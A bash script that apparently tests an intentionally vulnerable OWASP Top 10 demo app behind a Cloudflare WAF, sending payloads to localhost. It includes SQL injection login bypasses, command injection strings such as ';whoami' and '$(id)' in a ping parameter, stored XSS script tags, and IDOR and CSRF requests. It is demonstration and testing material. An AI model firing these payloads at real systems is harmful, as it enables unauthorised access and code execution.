#!/bin/bash

# OWASP Top 10 Security Demo - cURL Test Script
# Tests all vulnerabilities in the Cloudflare WAF demo app
# Usage: ./test-vulnerabilities.sh [BASE_URL]
# Default: http://localhost:5173

BASE_URL="${1:-http://localhost:5173}"

echo "================================================"
echo "OWASP Top 10 Security Demo - cURL Test Script"
echo "Target: $BASE_URL"
echo "================================================"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counter
TESTS_PASSED=0
TESTS_FAILED=0

# Helper function to print test header
print_header() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# Helper function to make requests and check response
make_request() {
    local description=$1
    local method=$2
    local endpoint=$3
    local data=$4
    local check=$5
    
    echo ""
    echo "Test: $description"
    echo "Command: curl -X $method \"$BASE_URL$endpoint\" ${data:+-d '$data'} -H 'Content-Type: application/json' -s"
    
    if [ -n "$data" ]; then
        RESPONSE=$(curl -X "$method" "$BASE_URL$endpoint" -d "$data" -H "Content-Type: application/json" -s 2>/dev/null)
    else
        RESPONSE=$(curl -X "$method" "$BASE_URL$endpoint" -s 2>/dev/null)
    fi
    
    if [ $? -eq 0 ] && [ -n "$RESPONSE" ]; then
        echo "Response: $RESPONSE"
        if echo "$RESPONSE" | grep -q "$check"; then
            echo -e "${GREEN}✓ PASSED${NC} - Found: $check"
            ((TESTS_PASSED++))
        else
            echo -e "${YELLOW}⚠ CHECK${NC} - Response received but '$check' not found"
            ((TESTS_FAILED++))
        fi
    else
        echo -e "${RED}✗ FAILED${NC} - No response or connection error"
        ((TESTS_FAILED++))
    fi
}

# ============================================================
# A01: BROKEN ACCESS CONTROL
# ============================================================
print_header "A01: BROKEN ACCESS CONTROL"

echo ""
echo "Testing direct object reference..."
echo "In a vulnerable app, changing IDs gives access to other users' data"

make_request "Access user data without authentication (IDOR)" \
    "GET" \
    "/api/access-control?id=1" \
    "" \
    "success"

# ============================================================
# A02: CRYPTOGRAPHIC FAILURES
# ============================================================
print_header "A02: CRYPTOGRAPHIC FAILURES"

echo ""
echo "Testing for exposed sensitive data..."

make_request "Exposed plaintext passwords and weak hashes" \
    "GET" \
    "/api/crypto" \
    "" \
    "password\|hash\|plaintext"

# ============================================================
# A03: SQL INJECTION
# ============================================================
print_header "A03: SQL INJECTION"

echo ""
echo "Testing SQL injection via JSON payload..."

make_request "SQL Injection with comment bypass" \
    "POST" \
    "/api/login" \
    '{"username":"admin'\''--","password":"anything"}' \
    "success"

make_request "SQL Injection with OR condition" \
    "POST" \
    "/api/login" \
    '{"username":"'\'' OR '\''1'\''='\''1","password":"'\'' OR '\''1'\''='\''1"}' \
    "success"

make_request "SQL Injection via GET parameters" \
    "GET" \
    "/api/login?username=admin'--&password=anything" \
    "" \
    "success"

# ============================================================
# A04: INSECURE DESIGN
# ============================================================
print_header "A04: INSECURE DESIGN"

echo ""
echo "Testing business logic flaws..."

make_request "Order confirmation without payment (Business Logic)" \
    "POST" \
    "/api/insecure-design" \
    '{"order_id":"12345"}' \
    "success\|confirmed"

# ============================================================
# A05: SECURITY MISCONFIGURATION
# ============================================================
print_header "A05: SECURITY MISCONFIGURATION"

echo ""
echo "Testing exposed configuration via API..."

curl -s "$BASE_URL/api/misconfig?endpoint=env" 2>/dev/null | head -3
curl -s "$BASE_URL/api/misconfig?endpoint=debug" 2>/dev/null | head -3

echo ""

# ============================================================
# A06: VULNERABLE COMPONENTS
# ============================================================
print_header "A06: VULNERABLE AND OUTDATED COMPONENTS"

echo ""
echo "Checking for exposed dependency information..."

make_request "Exposed vulnerable package versions" \
    "GET" \
    "/api/vulnerable-components" \
    "" \
    "version\|CVE\|vulnerable"

# ============================================================
# A07: AUTHENTICATION FAILURES
# ============================================================
print_header "A07: IDENTIFICATION AND AUTHENTICATION FAILURES"

echo ""
echo "Testing brute force vulnerability (no rate limiting)..."

make_request "Brute force with common passwords" \
    "GET" \
    "/api/auth-failures?action=brute-force&username=admin&password=SuperSecret123!" \
    "" \
    "success\|brute"

echo ""
echo "Testing predictable session IDs..."
make_request "Sequential session ID generation" \
    "GET" \
    "/api/auth-failures?action=session&user_id=1" \
    "" \
    "session_id\|predictable"

# ============================================================
# A08: SOFTWARE AND DATA INTEGRITY FAILURES
# ============================================================
print_header "A08: SOFTWARE AND DATA INTEGRITY FAILURES (CSRF)"

echo ""
echo "Testing CSRF vulnerability..."

make_request "CSRF - Delete user without token" \
    "POST" \
    "/api/delete-user" \
    '{"user_id":2}' \
    "success\|deleted"

make_request "CSRF - Update settings without token" \
    "POST" \
    "/api/settings" \
    '{"setting":"debug_mode","value":true}' \
    "success\|updated"

# ============================================================
# A09: SECURITY LOGGING AND MONITORING FAILURES
# ============================================================
print_header "A09: SECURITY LOGGING AND MONITORING FAILURES"

echo ""
echo "Testing for missing audit logging..."
echo "Make malicious requests - check if they're logged..."

curl -X POST "$BASE_URL/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"<script>alert(1)</script>","password":"test"}' \
    -s 2>/dev/null > /dev/null

echo "Malicious payload sent - check server logs for recording"

# ============================================================
# A10: SERVER-SIDE REQUEST FORGERY (SSRF) / COMMAND INJECTION
# ============================================================
print_header "A10: COMMAND INJECTION"

echo ""
echo "Testing command injection..."

make_request "Command injection with semicolon" \
    "GET" \
    "/api/ping?host=;whoami" \
    "" \
    "vulnerability\|detected"

make_request "Command injection with backticks" \
    "GET" \
    '/api/ping?host=`id`' \
    "" \
    "vulnerability\|detected"

make_request "Command injection with $()" \
    "GET" \
    "/api/ping?host=\$(id)" \
    "" \
    "vulnerability\|detected"

# ============================================================
# STORED XSS TESTS
# ============================================================
print_header "STORED XSS TESTS"

echo ""
echo "Testing stored cross-site scripting..."

make_request "Store XSS payload in comments" \
    "POST" \
    "/api/comment" \
    '{"content":"<script>alert(\"XSS\")</script>"}' \
    "success"

echo ""
echo "Verify XSS executes when viewing comments..."
curl -s "$BASE_URL/comments" 2>/dev/null | grep -o '<script>[^<]*</script>' | head -3

# ============================================================
# SUMMARY
# ============================================================
print_header "TEST SUMMARY"

echo ""
echo -e "Tests Passed: ${GREEN}$TESTS_PASSED${NC}"
echo -e "Tests Failed/Checked: ${YELLOW}$TESTS_FAILED${NC}"
echo ""
echo "================================================"
echo "Manual verification needed for:"
echo "- XSS execution in browser at: $BASE_URL/comments"
echo "- CSRF via HTML form submission"
echo "- Security misconfiguration file access"
echo "- Verify exploit payloads in server logs"
echo "================================================"
